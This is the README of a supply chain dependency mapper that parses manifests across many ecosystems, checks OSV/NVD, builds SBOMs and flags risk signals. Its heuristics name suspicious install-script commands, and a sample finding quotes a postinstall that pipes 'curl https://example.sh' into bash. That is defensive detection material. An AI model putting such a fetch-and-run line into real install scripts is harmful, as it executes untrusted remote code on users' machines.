# Supply Chain Mapper

## Overview

The **Supply Chain Mapper** is a static analysis tool that scans entire repositories to identify all **dependencies**, **manifests**, and **potential supply chain attack surfaces**. This tool focuses entirely on the **Mapper layer**, providing a **highly modular, extensible base system** that can be integrated with tools like `socket.dev`, `Snyk`, `Trivy`, or custom scanners.

The mapper performs comprehensive **cross-language dependency and metadata mapping** by:
- Recursively scanning code repositories
- Identifying all dependency-related files and manifests
- Extracting, normalizing, and outputting structured JSON data
- Computing lightweight **risk signals** (static heuristics) for each dependency
- Producing a consolidated JSON output file for downstream consumption

## 🚀 Features

### Supported Ecosystems (16 total)
- **JavaScript/TypeScript:** `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `tsconfig.json`
- **Python:** `requirements.txt`, `pyproject.toml`, `setup.py`, `Pipfile`, `Pipfile.lock`
- **Go:** `go.mod`, `go.sum`
- **Rust:** `Cargo.toml`, `Cargo.lock`
- **Java:** `pom.xml`, `build.gradle`, `gradle.lockfile`
- **Ruby:** `Gemfile`, `Gemfile.lock`
- **PHP:** `composer.json`, `composer.lock`
- **.NET/C#:** `*.csproj`, `packages.lock.json`
- **Swift:** `Package.swift`
- **R:** `DESCRIPTION`
- **C/C++:** `Makefile`, `*.mk`
- **Container / Infra:** `Dockerfile`, `docker-compose.yml`, `Dockerfile.*`
- **YAML Workflows:** GitHub Actions, GitLab CI, etc.
- **Lockfiles:** `yarn.lock`, `package-lock.json`, `pnpm-lock.yaml`
- **Configuration:** `tsconfig.json`

### Security & Compliance Features
- **Vulnerability Checking:** Integration with OSV database for known vulnerabilities
- **CVE Database Integration:** Direct NVD API queries with dynamic rate limiting
- **SBOM Generation:** Automatic CycloneDX format SBOM generation (default behavior)
- **License Detection:** Automatic license identification for dependencies

### Risk Detection Heuristics
- Install/Postinstall scripts with suspicious commands (`curl`, `wget`, `bash`, `python -c`, `node -e`)
- Obfuscated or encoded code (long base64 strings, `eval` usage)
- Git dependencies (`git+https` or `git@` sources)
- Unpinned versions (wildcards, `latest`, unversioned)
- Container/Dockerfile risks (unpinned base image tags, dangerous RUN commands)
- Binary or native modules in dependency trees
- Third-party CI Actions with unpinned references

---

## 🧱 Architecture

### 1. Repo Walker (`walker.py`)
- Recursively walks through the entire repository
- Honors `.gitignore` rules using `pathspec` library
- Collects all known manifest and lockfile types
- Supports custom ignore patterns via configuration

### 2. Manifest Parser Layer (`/src/parsers/`)
Modular, ecosystem-specific parsers that return normalized dependency records:

```json
{
  "ecosystem": "npm",
  "manifest_path": "services/api/package.json",
  "dependency": {
    "name": "express",
    "version": "^4.18.0",
    "source": "registry",
    "resolved": null
  },
  "metadata": {
    "dev_dependency": false,
    "line_number": 12,
    "script_section": false
  }
}
```

### 3. Risk Signal Extraction (`risk_heuristics.py`)
Static heuristic analysis for supply chain risk detection without network calls, including:
- Postinstall script analysis
- Git dependency detection
- Unpinned version identification
- Container risk assessment
- Obfuscated code detection

### 4. Vulnerability Checking (`vulnerability_checker.py`, `cve_checker.py`)
- **OSV Integration:** Queries the Open Source Vulnerability database for known vulnerabilities
- **CVE Database:** Direct NIST NVD API queries with intelligent rate limiting and caching
- **Dynamic Rate Limiting:** Exponential backoff with automatic recovery (1s to 10s delays)

### 5. SBOM Generation (`sbom_generator.py`)
- **CycloneDX Format:** Generates Software Bill of Materials in CycloneDX JSON format
- **PURL Support:** Proper Package URL generation for all ecosystems
- **Default Behavior:** SBOM generation is enabled by default (use `--no-sbom` to disable)

### 6. Output Formatting (`output.py`)
Formats the canonical JSON output structure with vulnerabilities and CVEs:

```json
{
  "repo": {
    "path": "/path/to/repo",
    "commit_hash": "abc123",
    "scan_date": "2023-01-01T00:00:00Z"
  },
  "scan_summary": {
    "total_manifests": 4,
    "ecosystems_detected": ["npm", "python", "docker"],
    "total_dependencies": 15,
    "total_signals": 3,
    "total_vulnerabilities": 2,
    "total_cves": 1
  },
  "dependencies": [
    {
      "ecosystem": "npm",
      "manifest_path": "services/api/package.json",
      "dependency": {
        "name": "axios",
        "version": "^1.3.2",
        "source": "registry",
        "resolved": "https://registry.npmjs.org/axios/-/axios-1.3.2.tgz"
      },
      "metadata": {
        "dev_dependency": false,
        "line_number": 5,
        "script_section": true
      },
      "signals": [
        {
          "type": "postinstall_script",
          "file": "package.json",
          "line": 45,
          "detail": "postinstall runs 'curl https://example.sh | bash'",
          "severity": "high"
        }
      ],
      "risk_score": 0.85
    }
  ],
  "vulnerabilities": [
    {
      "dependency": {
        "ecosystem": "npm",
        "dependency": {"name": "axios", "version": "^1.3.2"}
      },
      "vulnerability": {
        "id": "GHSA-4w2v-q235-vp99",
        "summary": "Axios Inefficient Regular Expression Complexity vulnerability",
        "details": "The axios JavaScript library has a vulnerability due to inefficient regular expression complexity...",
        "severity": "HIGH",
        "references": ["https://github.com/axios/axios/security/advisories/GHSA-4w2v-q235-vp99"]
      }
    }
  ],
  "cves": [
    {
      "dependency": {
        "ecosystem": "npm",
        "dependency": {"name": "axios", "version": "^1.3.2"}
      },
      "cve": {
        "id": "CVE-2023-45857",
        "description": "Axios is vulnerable to regular expression denial of service (ReDoS)...",
        "severity": "HIGH",
        "references": [{"url": "https://nvd.nist.gov/vuln/detail/CVE-2023-45857"}],
        "published": "2023-10-16T14:15:00.000",
        "lastModified": "2023-10-24T19:15:00.000"
      }
    }
  ]
}
```

---

## 🛠️ Installation & Setup

### Prerequisites
- Python 3.11+
- `pip` package manager

### Dependencies
Install required dependencies:
```bash
pip install -r requirements.txt
```

**Key Dependencies:**
- `pathspec`: Gitignore pattern matching
- `PyYAML`: YAML configuration and parsing
- `colorama`: Cross-platform colored terminal output
- `requests`: HTTP client for vulnerability/CVEs APIs

### Quick Start
```bash
# Scan a directory
python main.py <directory-to-scan>

# Scan with different output formats
python main.py repo-to-scan --output report.json    # JSON (default)
python main.py repo-to-scan --output report.csv --format csv  # CSV format
python main.py repo-to-scan --output report.xml --format xml  # XML format

# Security scanning options
python main.py repo-to-scan --check-vulns            # Check vulnerabilities via OSV
python main.py repo-to-scan --check-cves             # Check CVEs via NVD API
python main.py repo-to-scan --no-sbom                # Skip SBOM generation

# Advanced options
python main.py repo-to-scan --verbose --log scan.log  # Verbose logging with file
python main.py repo-to-scan --quiet                    # Suppress progress output
python main.py repo-to-scan --no-color                 # Disable colored output
```

### Project Structure
```
supply-chain-mapper-agent/
├── main.py                       # Main entry point script
├── config.yaml                   # Configuration file
├── README.md                     # This documentation
├── requirements.txt             # Python dependencies
├── output.json                   # Default scan output
├── sbom.json                     # Default SBOM output
├── repo-to-scan/                # Directory containing files to scan
│   ├── package.json             # JS/Node.js manifest
│   ├── pyproject.toml           # Python project config
│   ├── requirements.txt         # Python dependencies
│   ├── go.mod                   # Go module dependencies
│   ├── Cargo.toml               # Rust cargo dependencies
│   ├── pom.xml                  # Java Maven project
│   ├── Gemfile                  # Ruby dependencies
│   ├── composer.json            # PHP dependencies
│   ├── Package.swift             # Swift package manifest
│   ├── DESCRIPTION               # R package description
│   └── Dockerfile*              # Container manifests
└── src/                         # Source code
    ├── config.py                # Configuration management
    ├── logger.py                # Logging utilities
    ├── progress.py              # Progress indicators
    ├── output.py                # Output formatting
    ├── risk_heuristics.py       # Risk analysis
    ├── walker.py                # Repository walker (git ls-files)
    ├── vulnerability_checker.py # OSV vulnerability checking
    ├── cve_checker.py           # NVD CVE checking with rate limiting
    ├── sbom_generator.py        # CycloneDX SBOM generation
    └── parsers/                 # Ecosystem-specific parsers
        ├── npm_parser.py
        ├── python_parser.py
        ├── go_parser.py
        ├── dockerfile_parser.py
        ├── rust_parser.py
        ├── java_parser.py
        ├── ruby_parser.py
        ├── php_parser.py
        ├── dotnet_parser.py
        ├── yaml_parser.py
        ├── lockfile_parser.py
        ├── swift_parser.py
        ├── r_parser.py
        └── makefile_parser.py
```

---

## 📋 Usage

### Basic Usage
```bash
python main.py <directory-to-scan>
```

### Examples
```bash
# Scan current directory
python main.py .

# Scan specific directory
python main.py repo-to-scan

# Use custom configuration and output
python main.py repo-to-scan --config config.yaml --output scan_report.json
```

### Command Line Options
| Option | Short | Description | Default |
|--------|-------|-------------|---------|
| `path` | - | Path to the repository to scan (positional) | Required |
| `--output OUTPUT` | `-o` | Output file for the scan report | `mapper_report.json` |
| `--format FORMAT` | `-f` | Output format (json, csv, xml) | `json` |
| `--config CONFIG` | `-c` | Path to config file | None |
| `--verbose` | `-v` | Enable verbose logging | False |
| `--log FILE` | - | Log file path | None |
| `--quiet` | `-q` | Suppress progress output | False |
| `--no-color` | - | Disable colored output | False |
| `--include-binaries` | - | Include binary detection in scan | False |
| `--check-vulns` | - | Check dependencies for vulnerabilities via OSV | False |
| `--check-cves` | - | Check dependencies for CVEs via NVD API | False |
| `--no-sbom` | - | Skip SBOM generation | False |
| `--help` | - | Show help message | - |

### Output Formats

The mapper supports multiple output formats for different use cases:

- **JSON** (default): Comprehensive structured data for programmatic consumption
- **CSV**: Tabular format suitable for spreadsheets and data analysis
- **XML**: Structured markup format for enterprise systems

### Enhanced Features

- **Progress Indicators**: Real-time progress bars and status updates during scanning
- **Colored Output**: Color-coded terminal output for better readability
- **Comprehensive Logging**: Verbose logging with file output option
- **Error Handling**: Robust error handling with detailed error messages
- **Cross-Platform**: Compatible with Windows, macOS, and Linux

---

## ⚙️ Configuration

The mapper supports configuration via `config.yaml`:

```yaml
# Supply Chain Risk Mapper Configuration

# Paths to ignore during scanning
paths_to_ignore:
  - "node_modules/"
  - "vendor/"
  - ".git/"
  - "__pycache__/"
  - "*.log"
  - "dist/"
  - "build/"
  - ".venv/"
  - "venv/"

# File types to include/exclude
file_types:
  include: []
  exclude: 
    - "*.tmp"
    - "*.bak"
    - ".DS_Store"

# Severity thresholds
severity_thresholds:
  low: true
  medium: true
  high: true
  critical: true

# Optional settings
offline_mode: false
include_binaries: false

# Risk heuristics toggles
risk_heuristics:
  install_scripts: true
  obfuscated_code: true
  git_dependencies: true
  unpinned_versions: true
  binary_modules: true
  container_risks: true
  third_party_ci_actions: true
```

---

## 🧪 Testing

### Running Tests
The mapper can be tested by scanning the included `repo-to-scan` directory:

```bash
python main.py repo-to-scan --output test_results.json
```

### Test Results Example
- **43 total dependencies** across **8 ecosystems**
- **10 manifests** discovered and parsed
- **17 risk signals** identified with risk scores

---

## 🚀 Example Output

```json
{
  "repo": {
    "path": "/path/to/repo",
    "commit_hash": "abc123",
    "scan_date": "2023-01-01T00:00:00Z"
  },
  "scan_summary": {
    "total_manifests": 10,
    "ecosystems_detected": ["python", "npm", "go", "docker", "rust", "java", "ruby", "php"],
    "total_dependencies": 43,
    "total_signals": 17
  },
  "dependencies": [
    {
      "ecosystem": "python",
      "manifest_path": "repo-to-scan/requirements.txt",
      "dependency": {
        "name": "requests",
        "version": "*",
        "source": "pypi",
        "resolved": null
      },
      "metadata": {
        "dev_dependency": false,
        "line_number": 1,
        "script_section": false
      },
      "signals": [
        {
          "type": "unpinned_version",
          "file": "repo-to-scan/requirements.txt",
          "line": 1,
          "detail": "Dependency 'requests' has unpinned version '*' (wildcard version)",
          "severity": "high"
        }
      ],
      "risk_score": 0.8
    }
  ]
}
```

---

## 🛡️ Security Considerations

- **Static-Only Analysis**: No network calls or execution of code during scans
- **File System Isolation**: Scans only the specified directory and subdirectories
- **Configuration Validation**: All input paths are validated to prevent directory traversal
- **No Dependency Installation**: Does not install any dependencies during scanning

---

## 📈 Extending the Mapper

### Adding New Parsers
To add support for new ecosystems:
1. Create a new parser in `/src/parsers/` (e.g. `new_parser.py`)
2. Follow the same interface pattern as existing parsers
3. Add the new parser to `/src/parsers/__init__.py`
4. Update `main.py` to import and use the new parser
5. Update `/src/walker.py` with new manifest patterns if needed

### Adding New Heuristics
Add new risk detection patterns in `risk_heuristics.py` following the existing pattern.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

---

## 🚀 Current Capabilities

### Supported Ecosystems (16 total)
- **JavaScript/TypeScript:** `package.json`, `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`, `tsconfig.json`
- **Python:** `requirements.txt`, `pyproject.toml`, `setup.py`, `Pipfile`, `Pipfile.lock`
- **Go:** `go.mod`, `go.sum`
- **Rust:** `Cargo.toml`, `Cargo.lock`
- **Java:** `pom.xml`, `build.gradle`, `gradle.lockfile`
- **Ruby:** `Gemfile`, `Gemfile.lock`
- **PHP:** `composer.json`, `composer.lock`
- **.NET/C#:** `*.csproj`, `packages.lock.json`
- **Swift:** `Package.swift`
- **R:** `DESCRIPTION`
- **C/C++:** `Makefile`, `*.mk`
- **Container / Infra:** `Dockerfile`, `docker-compose.yml`, `Dockerfile.*`
- **YAML Workflows:** GitHub Actions, GitLab CI, etc.
- **Lockfiles:** `yarn.lock`, `package-lock.json`, `pnpm-lock.yaml`
- **Configuration:** `tsconfig.json`

### Core Features
- **Cross-Language Dependency Mapping:** Identifies dependencies across 16+ programming languages and ecosystems
- **Vulnerability Database Integration:** OSV and NVD CVE checking with dynamic rate limiting
- **SBOM Generation:** Automatic CycloneDX format Software Bill of Materials
- **Risk Signal Detection:** Static heuristic analysis for potential security risks
- **License Detection:** Automatic license identification for compliance
- **Modular Architecture:** Extensible parser system for easy addition of new languages
- **Gitignore Compliance:** Respects `.gitignore` and custom ignore patterns
- **Configuration Support:** YAML-based configuration for custom settings
- **Risk Scoring:** Automated risk scoring based on detected vulnerabilities
- **Detailed Reporting:** Comprehensive JSON output with dependency metadata
- **Multi-Manifest Support:** Handles various lockfiles and manifest formats
- **Development vs Production:** Distinguishes between dev and production dependencies
- **Line Number Tracking:** Maintains line numbers for precise issue location
- **Performance Optimization:** Uses `git ls-files` for efficient repository traversal

---

## 🔮 Future Enhancements

To become the world's top S-tier supply chain security tool, here's an extensive list of enhancements:

### 🚀 **Advanced Language Support**
- **Kotlin/Java Groovy:** `build.gradle.kts`, `build.gradle`, `settings.gradle`
- **Scala:** `build.sbt`, `build.scala`, `build.sbtproj`
- **Swift:** `Package.swift`, `Podfile`, `Cartfile`
- **Objective-C:** `Podfile`, `Cartfile`
- **Elixir:** `mix.exs`, `rebar.config`
- **Erlang:** `rebar.config`, `rebar.lock`
- **Haskell:** `package.yaml`, `stack.yaml`, `cabal.config`
- **Perl:** `cpanfile`, `Makefile.PL`
- **R:** `DESCRIPTION`, `packrat/packrat.lock`
- **MATLAB:** `matlabproject.mlproj`, `dependencies.json`
- **Dart/Flutter:** `pubspec.yaml`, `pubspec.lock`
- **Lua:** `rockspec`, `LuaRocks deps file`
- **Clojure:** `project.clj`, `deps.edn`
- **Solidity/Smart Contracts:** `truffle-config.js`, `hardhat.config.js`
- **Rust:** Enhanced support with `Cargo.lock` analysis
- **Assembly/Embedded:** `platformio.ini`, `CMakeLists.txt`, `Makefile`

### 📊 **Enhanced Analysis Features**
- **Vulnerability Integration:** Real-time CVE database lookup against detected packages (NVD, OSV, Snyk, GitHub Advisory)
- **License Scanning:** Identify license types and potential license conflicts (GPL, AGPL, proprietary licenses)
- **Supply Chain Graph:** Visualization of dependency trees and transitive relationships
- **Security Scorecards:** Integration with OpenSSF Scorecards for repository health metrics
- **Binary Analysis:** Deep scanning of compiled binaries for embedded dependencies
- **Firmware Analysis:** IoT and embedded device supply chain tracking
- **Container Image Scanning:** Deep analysis of Docker image layers and base images
- **Git Submodule Tracking:** Complete submodule dependency mapping
- **Git Subtree Analysis:** Subtree-based dependency tracking
- **Monorepo Support:** Advanced analysis for monorepo architectures (Nx, Lerna, Bazel)

### 🛡️ **Advanced Security Features**
- **SBOM Generation:** Full Software Bill of Materials (SPDX, CycloneDX, SWID) format support
- **Threat Modeling:** Automated threat modeling based on dependency relationships
- **Anomaly Detection:** ML-powered identification of unusual dependency patterns
- **Behavioral Analysis:** Static analysis of potential malicious behaviors in dependencies
- **Code Signing Verification:** Check for and validate code signatures on packages
- **Provenance Tracking:** Integration with Sigstore, Rekor for artifact verification
- **Dependency Confusion Detection:** Identify packages with similar names to internal packages
- **Typosquatting Detection:** Find malicious packages with names similar to popular packages
- **Backdoor Scanning:** Static analysis for potential backdoors and malicious code
- **Steganography Detection:** Identify hidden code in images or other assets

### 📈 **Scalability & Performance**
- **Distributed Scanning:** Support for large-scale enterprise environments
- **Incremental Scanning:** Only scan changed files/directories for improved performance
- **Caching Mechanisms:** Cache results to avoid repeated analysis of unchanged dependencies
- **Parallel Processing:** Multi-threaded scanning for faster execution
- **Cloud-Native Support:** Kubernetes, Docker swarm compatibility
- **Enterprise Deployment:** Support for on-premise enterprise installations
- **API Gateway:** RESTful API for enterprise integration
- **Real-time Monitoring:** Continuous monitoring of supply chains

### 🎯 **Intelligence & Analytics**
- **Risk Scoring Algorithm:** Advanced ML-based risk scoring considering multiple factors
- **Author Reputation Analysis:** Analyze maintainers' reputation and history
- **Community Health Metrics:** Stars, forks, contributors, issue resolution time
- **Update Frequency Analysis:** Package update patterns and maintenance activity
- **Dependency Age Analysis:** How old are the dependencies being used
- **Popularity Comparison:** Compare dependency popularity against alternatives
- **Geopolitical Risk Assessment:** Identify dependencies from high-risk regions
- **Financial Health:** Check if packages are financially supported by their maintainers

### 🔄 **Integration & Ecosystem**
- **CI/CD Integration:** GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure DevOps
- **IDE Integration:** VS Code, IntelliJ, Vim plugins for real-time scanning
- **Package Registry Integration:** npm, PyPI, Maven Central, NuGet, crates.io monitoring
- **Security Orchestration:** SOAR integration for automated incident response
- **Ticketing Systems:** Jira, ServiceNow, PagerDuty integration
- **Compliance Frameworks:** SOX, HIPAA, GDPR, PCI-DSS reporting
- **DevSecOps Pipelines:** Seamless integration into existing DevSecOps workflows

### 📊 **Reporting & Visualization**
- **Interactive Dashboards:** Web-based dashboard with real-time metrics
- **Trend Analysis:** Historical tracking of security metrics over time
- **Executive Reporting:** Summary reports for management and compliance
- **Export Capabilities:** PDF, Excel, JSON, XML export formats
- **Custom Reporting:** User-defined report templates and formats
- **Alerting System:** Real-time notifications for critical risks
- **Comparison Tools:** Compare different codebases or time periods
- **Drill-Down Capabilities:** Detailed analysis from summary to individual dependencies

### 🔐 **Enterprise Features**
- **Multi-tenancy:** Support for multiple teams/organizations in single deployment
- **Role-Based Access Control:** Fine-grained permissions for different user roles
- **Audit Logging:** Complete audit trail of all scans and changes
- **Compliance Reporting:** Pre-built reports for regulatory compliance
- **Proxy/VPN Support:** Enterprise proxy and VPN compatibility
- **SAML/SSO Integration:** Single sign-on for enterprise authentication
- **API Rate Limiting:** Enterprise-grade API rate limiting and quotas
- **Data Retention Policies:** Configurable data retention and archival policies

### 🧠 **AI/ML Capabilities**
- **Predictive Risk Analysis:** Predict future vulnerabilities based on code patterns
- **Natural Language Processing:** Analyze commit messages and issue descriptions for risk indicators
- **Pattern Recognition:** Identify common patterns in compromised packages
- **Automated Remediation:** Suggest secure alternatives automatically
- **Behavioral Learning:** Learn from organization-specific patterns
- **Zero-day Detection:** Early detection of zero-day vulnerabilities
- **Adversarial Analysis:** Detect and respond to sophisticated supply chain attacks
- **Recommender System:** Suggest optimal dependency versions based on security metrics

### 🌐 **Global & Compliance**
- **Multi-language Support:** Interface and reports in multiple languages
- **Regulatory Compliance:** Support for global compliance requirements
- **Export Control:** Compliance with export regulations for sensitive dependencies
- **Data Localization:** Support for data residency requirements
- **Certification Support:** FIPS, Common Criteria, and other security certifications
- **Global Threat Intelligence:** Integration with global threat intelligence feeds

### 🎨 **User Experience**
- **Web Interface:** Full-featured web-based user interface
- **Mobile App:** Mobile application for on-the-go security monitoring
- **CLI Enhancements:** Advanced CLI with interactive modes and batch processing
- **Customizable UI:** User-configurable dashboards and views
- **Accessibility:** Full WCAG compliance for accessibility
- **API Documentation:** Comprehensive API documentation and SDKs
- **Tutorials & Training:** Built-in learning resources and tutorials
- **Community Support:** Active community forums and support channels

### 🛠️ **Advanced Technical Features**
- **Custom Heuristic Engine:** User-defined risk detection patterns
- **Plugin Architecture:** Extensible architecture for custom parsers and analyzers
- **Machine Learning Model Training:** Custom model training for organization-specific threats
- **Blockchain Verification:** Integration with blockchain-based verification systems
- **Quantum Resistant Analysis:** Analysis of crypto dependencies for quantum readiness
- **Hardware Security:** Integration with hardware security modules (HSMs)
- **Zero Trust Architecture:** Full zero-trust security model implementation
- **Immutable Infrastructure:** Support for immutable infrastructure patterns

These enhancements would position the supply chain mapper as the world's premier solution for supply chain security, capable of protecting organizations from the most sophisticated supply chain attacks while maintaining excellent usability and scalability.